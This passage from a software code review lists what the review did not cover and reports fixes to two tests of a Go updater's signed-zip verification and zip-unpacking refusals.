- The non-source files in the range (changes/, handoffs/, reviews/, testing/ logs, DECISIONS.md beyond the ADR-039/040/041 hunks) were not read line by line. They are records, not behaviour.
- Intermediate commits b1ecab3 and d3e493b were not reviewed separately. Only the net v1.9.0..c30b8da result was reviewed. The stray-argument refusal that d3e493b added and c30b8da removed was not re-checked beyond confirming that the net `main.go` diff has no parse change against v1.9.0.
- No real signed release zip was exercised. Verification rests on the test fixtures (`signedZipDir`), not on an actual `/preflight` artifact.
- `/review --docs` freshness beyond the grep above, and the `TestHarnessMap` map labels, are out of this code review's scope.

## Outcome

1. **No end-to-end half-pair test: fixed.**
   - `TestUpdateFromZipHalfPairSaysUnverified` puts only `SHA256SUMS`, then only `.sig`, beside a zip. It checks the setup first, then asserts the install succeeds, the output says `UNVERIFIED`, and the manifest records `;unverified`.
   - Must-fail: restoring `&&` in `VerifyZipSums` compiled and failed both subtests.
2. **`TestUnpackZipLateRefusalCreatesNoParent` checked no refusal text: fixed.** Each case now asserts its own refusal ("is a symlink", "appears twice"). Must-fail: rewording the symlink refusal compiled and failed the `symlink` case.
